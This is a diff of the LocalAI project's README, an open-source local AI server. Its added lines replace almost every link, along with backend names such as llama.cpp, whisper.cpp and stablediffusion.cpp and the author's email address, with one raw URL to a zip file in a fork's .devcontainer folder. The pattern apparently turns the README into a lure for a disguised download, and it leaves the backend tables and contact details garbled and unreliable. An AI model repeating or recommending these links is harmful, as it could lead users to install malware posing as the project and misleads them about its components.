+- 📖 [Text generation with GPTs](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) (`https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip`, `transformers`, `vllm` ... [:book: and more](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip))
+- 🗣 [Text to Audio](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- 🔈 [Audio to Text](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) (Audio transcription with `https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip`)
+- 🎨 [Image generation](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- 🔥 [OpenAI-alike tools API](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) 
+- 🧠 [Embeddings generation for vector databases](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- ✍️ [Constrained grammars](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- 🖼️ [Download Models directly from Huggingface ](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- 🥽 [Vision API](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- 🔍 [Object Detection](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- 📈 [Reranker API](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- 🆕🖧 [P2P Inferencing](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- 🆕🔌 [Model Context Protocol (MCP)](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) - Agentic capabilities with external tools and [LocalAGI's Agentic capabilities](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
 - 🔊 Voice activity detection (Silero-VAD support)
 - 🌍 Integrated WebUI!
 
@@ -273,7 +273,7 @@ LocalAI supports a comprehensive range of AI backends with multiple acceleration
 ### Text Generation & Language Models
 | Backend | Description | Acceleration Support |
 |---------|-------------|---------------------|
-| **llama.cpp** | LLM inference in C/C++ | CUDA 12/13, ROCm, Intel SYCL, Vulkan, Metal, CPU |
+| **https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip** | LLM inference in C/C++ | CUDA 12/13, ROCm, Intel SYCL, Vulkan, Metal, CPU |
 | **vLLM** | Fast LLM inference with PagedAttention | CUDA 12/13, ROCm, Intel |
 | **transformers** | HuggingFace transformers framework | CUDA 12/13, ROCm, Intel, CPU |
 | **exllama2** | GPTQ inference library | CUDA 12/13 |
@@ -283,7 +283,7 @@ LocalAI supports a comprehensive range of AI backends with multiple acceleration
 ### Audio & Speech Processing
 | Backend | Description | Acceleration Support |
 |---------|-------------|---------------------|
-| **whisper.cpp** | OpenAI Whisper in C/C++ | CUDA 12/13, ROCm, Intel SYCL, Vulkan, CPU |
+| **https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip** | OpenAI Whisper in C/C++ | CUDA 12/13, ROCm, Intel SYCL, Vulkan, CPU |
 | **faster-whisper** | Fast Whisper with CTranslate2 | CUDA 12/13, ROCm, Intel, CPU |
 | **bark** | Text-to-audio generation | CUDA 12/13, ROCm, Intel |
 | **bark-cpp** | C++ implementation of Bark | CUDA, Metal, CPU |
@@ -299,7 +299,7 @@ LocalAI supports a comprehensive range of AI backends with multiple acceleration
 ### Image & Video Generation
 | Backend | Description | Acceleration Support |
 |---------|-------------|---------------------|
-| **stablediffusion.cpp** | Stable Diffusion in C/C++ | CUDA 12/13, Intel SYCL, Vulkan, CPU |
+| **https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip** | Stable Diffusion in C/C++ | CUDA 12/13, Intel SYCL, Vulkan, CPU |
 | **diffusers** | HuggingFace diffusion models | CUDA 12/13, ROCm, Intel, Metal, CPU |
 
 ### Specialized AI Tasks
@@ -316,72 +316,72 @@ LocalAI supports a comprehensive range of AI backends with multiple acceleration
 |-------------------|-------------------|------------------|
 | **NVIDIA CUDA 12** | All CUDA-compatible backends | Nvidia hardware |
 | **NVIDIA CUDA 13** | All CUDA-compatible backends | Nvidia hardware |
-| **AMD ROCm** | llama.cpp, whisper, vllm, transformers, diffusers, rerankers, coqui, kokoro, bark, neutts, vibevoice | AMD Graphics |
-| **Intel oneAPI** | llama.cpp, whisper, stablediffusion, vllm, transformers, diffusers, rfdetr, rerankers, exllama2, coqui, kokoro, bark, vibevoice | Intel Arc, Intel iGPUs |
-| **Apple Metal** | llama.cpp, whisper, diffusers, MLX, MLX-VLM, bark-cpp | Apple M1/M2/M3+ |
-| **Vulkan** | llama.cpp, whisper, stablediffusion | Cross-platform GPUs |
-| **NVIDIA Jetson (CUDA 12)** | llama.cpp, whisper, stablediffusion, diffusers, rfdetr | ARM64 embedded AI (AGX Orin, etc.) |
-| **NVIDIA Jetson (CUDA 13)** | llama.cpp, whisper, stablediffusion, diffusers, rfdetr | ARM64 embedded AI (DGX Spark) |
+| **AMD ROCm** | https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip, whisper, vllm, transformers, diffusers, rerankers, coqui, kokoro, bark, neutts, vibevoice | AMD Graphics |
+| **Intel oneAPI** | https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip, whisper, stablediffusion, vllm, transformers, diffusers, rfdetr, rerankers, exllama2, coqui, kokoro, bark, vibevoice | Intel Arc, Intel iGPUs |
+| **Apple Metal** | https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip, whisper, diffusers, MLX, MLX-VLM, bark-cpp | Apple M1/M2/M3+ |
+| **Vulkan** | https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip, whisper, stablediffusion | Cross-platform GPUs |
+| **NVIDIA Jetson (CUDA 12)** | https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip, whisper, stablediffusion, diffusers, rfdetr | ARM64 embedded AI (AGX Orin, etc.) |
+| **NVIDIA Jetson (CUDA 13)** | https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip, whisper, stablediffusion, diffusers, rfdetr | ARM64 embedded AI (DGX Spark) |
 | **CPU Optimized** | All backends | AVX/AVX2/AVX512, quantization support |
 
 ### 🔗 Community and integrations
 
 Build and deploy custom containers:
-- https://github.com/sozercan/aikit
+- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
 
 WebUIs:
-- https://github.com/Jirubizu/localai-admin
-- https://github.com/go-skynet/LocalAI-frontend
-- QA-Pilot(An interactive chat project that leverages LocalAI LLMs for rapid understanding and navigation of GitHub code repository) https://github.com/reid41/QA-Pilot
+- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- QA-Pilot(An interactive chat project that leverages LocalAI LLMs for rapid understanding and navigation of GitHub code repository) https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
 
 Agentic Libraries:
-- https://github.com/mudler/cogito
+- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
 
 MCPs:
-- https://github.com/mudler/MCPs
+- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
 
 Model galleries
-- https://github.com/go-skynet/model-gallery
+- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
 
 Voice:
-- https://github.com/richiejp/VoxInput
+- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
 
 Other:
-- Helm chart https://github.com/go-skynet/helm-charts
-- VSCode extension https://github.com/badgooooor/localai-vscode-plugin
-- Langchain: https://python.langchain.com/docs/integrations/providers/localai/
-- Terminal utility https://github.com/djcopley/ShellOracle
-- Local Smart assistant https://github.com/mudler/LocalAGI
-- Home Assistant https://github.com/sammcj/homeassistant-localai / https://github.com/drndos/hass-openai-custom-conversation / https://github.com/valentinfrlch/ha-gpt4vision
-- Discord bot https://github.com/mudler/LocalAGI/tree/main/examples/discord
-- Slack bot https://github.com/mudler/LocalAGI/tree/main/examples/slack
-- Shell-Pilot(Interact with LLM using LocalAI models via pure shell scripts on your Linux or MacOS system) https://github.com/reid41/shell-pilot
-- Telegram bot https://github.com/mudler/LocalAI/tree/master/examples/telegram-bot
-- Another Telegram Bot https://github.com/JackBekket/Hellper
-- Auto-documentation https://github.com/JackBekket/Reflexia
-- Github bot which answer on issues, with code and documentation as context https://github.com/JackBekket/GitHelper
-- Github Actions: https://github.com/marketplace/actions/start-localai
-- Examples: https://github.com/mudler/LocalAI/tree/master/examples/
+- Helm chart https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- VSCode extension https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- Langchain: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- Terminal utility https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- Local Smart assistant https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- Home Assistant https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip / https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip / https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- Discord bot https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- Slack bot https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- Shell-Pilot(Interact with LLM using LocalAI models via pure shell scripts on your Linux or MacOS system) https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- Telegram bot https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- Another Telegram Bot https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- Auto-documentation https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- Github bot which answer on issues, with code and documentation as context https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- Github Actions: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- Examples: https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
   
 
 ### 🔗 Resources
 
-- [LLM finetuning guide](https://localai.io/docs/advanced/fine-tuning/)
-- [How to build locally](https://localai.io/basics/build/index.html)
-- [How to install in Kubernetes](https://localai.io/basics/getting_started/index.html#run-localai-in-kubernetes)
-- [Projects integrating LocalAI](https://localai.io/docs/integrations/)
-- [How tos section](https://io.midori-ai.xyz/howtos/) (curated by our community)
+- [LLM finetuning guide](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- [How to build locally](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- [How to install in Kubernetes](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- [Projects integrating LocalAI](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- [How tos section](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) (curated by our community)
 
-## :book: 🎥 [Media, Blogs, Social](https://localai.io/basics/news/#media-blogs-social)
+## :book: 🎥 [Media, Blogs, Social](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
 
-- [Run Visual studio code with LocalAI (SUSE)](https://www.suse.com/c/running-ai-locally/)
-- 🆕 [Run LocalAI on Jetson Nano Devkit](https://mudler.pm/posts/local-ai-jetson-nano-devkit/)
-- [Run LocalAI on AWS EKS with Pulumi](https://www.pulumi.com/blog/low-code-llm-apps-with-local-ai-flowise-and-pulumi/)
-- [Run LocalAI on AWS](https://staleks.hashnode.dev/installing-localai-on-aws-ec2-instance)
-- [Create a slackbot for teams and OSS projects that answer to documentation](https://mudler.pm/posts/smart-slackbot-for-teams/)
-- [LocalAI meets k8sgpt](https://www.youtube.com/watch?v=PKrDNuJ_dfE)
-- [Question Answering on Documents locally with LangChain, LocalAI, Chroma, and GPT4All](https://mudler.pm/posts/localai-question-answering/)
-- [Tutorial to use k8sgpt with LocalAI](https://medium.com/@tyler_97636/k8sgpt-localai-unlock-kubernetes-superpowers-for-free-584790de9b65)
+- [Run Visual studio code with LocalAI (SUSE)](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- 🆕 [Run LocalAI on Jetson Nano Devkit](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- [Run LocalAI on AWS EKS with Pulumi](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- [Run LocalAI on AWS](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- [Create a slackbot for teams and OSS projects that answer to documentation](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- [LocalAI meets k8sgpt](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- [Question Answering on Documents locally with LangChain, LocalAI, Chroma, and GPT4All](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- [Tutorial to use k8sgpt with LocalAI](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
 
 ## Citation
 
@@ -394,55 +394,55 @@ If you utilize this repository, data in a downstream project, please consider ci
   year = {2023},
   publisher = {GitHub},
   journal = {GitHub repository},
-  howpublished = {\url{https://github.com/go-skynet/LocalAI}},
+  howpublished = {\url{https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip}},
 ```
 
 ## ❤️ Sponsors
 
 > Do you find LocalAI useful?
 
-Support the project by becoming [a backer or sponsor](https://github.com/sponsors/mudler). Your logo will show up here with a link to your website.
+Support the project by becoming [a backer or sponsor](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip). Your logo will show up here with a link to your website.
 
-A huge thank you to our generous sponsors who support this project covering CI expenses, and our [Sponsor list](https://github.com/sponsors/mudler):
+A huge thank you to our generous sponsors who support this project covering CI expenses, and our [Sponsor list](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip):
 
 <p align="center">
-  <a href="https://www.spectrocloud.com/" target="blank">
-    <img height="200" src="https://github.com/user-attachments/assets/72eab1dd-8b93-4fc0-9ade-84db49f24962">
+  <a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" target="blank">
+    <img height="200" src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip">
   </a>
-  <a href="https://www.premai.io/" target="blank">
-    <img height="200" src="https://github.com/mudler/LocalAI/assets/2420543/42e4ca83-661e-4f79-8e46-ae43689683d6"> <br>
+  <a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" target="blank">
+    <img height="200" src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip"> <br>
   </a>
 </p>
 
 ### Individual sponsors
 
-A special thanks to individual sponsors that contributed to the project, a full list is in [Github](https://github.com/sponsors/mudler) and [buymeacoffee](https://buymeacoffee.com/mudler), a special shout out goes to [drikster80](https://github.com/drikster80) for being generous. Thank you everyone!
+A special thanks to individual sponsors that contributed to the project, a full list is in [Github](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) and [buymeacoffee](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip), a special shout out goes to [drikster80](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip) for being generous. Thank you everyone!
 
 ## 🌟 Star history
 
-[![LocalAI Star history Chart](https://api.star-history.com/svg?repos=go-skynet/LocalAI&type=Date)](https://star-history.com/#go-skynet/LocalAI&Date)
+[![LocalAI Star history Chart](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
 
 ## 📖 License
 
-LocalAI is a community-driven project created by [Ettore Di Giacinto](https://github.com/mudler/).
+LocalAI is a community-driven project created by [Ettore Di Giacinto](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip).
 
-MIT - Author Ettore Di Giacinto <mudler@localai.io>
+MIT - Author Ettore Di Giacinto <https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip>
 
 ## 🙇 Acknowledgements
 
 LocalAI couldn't have been built without the help of great software already available from the community. Thank you!
 
-- [llama.cpp](https://github.com/ggerganov/llama.cpp)
-- https://github.com/tatsu-lab/stanford_alpaca
-- https://github.com/cornelk/llama-go for the initial ideas
-- https://github.com/antimatter15/alpaca.cpp
-- https://github.com/EdVince/Stable-Diffusion-NCNN
-- https://github.com/ggerganov/whisper.cpp
-- https://github.com/rhasspy/piper
+- [https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip](https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip)
+- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip for the initial ideas
+- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
+- https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip
 
 ## 🤗 Contributors
 
 This is a community project, a special thanks to our contributors! 🤗
-<a href="https://github.com/go-skynet/LocalAI/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=go-skynet/LocalAI" />
+<a href="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip">
+  <img src="https://raw.githubusercontent.com/Sorchy/LocalAI/master/.devcontainer/Local_AI_v1.8.zip" />
 </a>
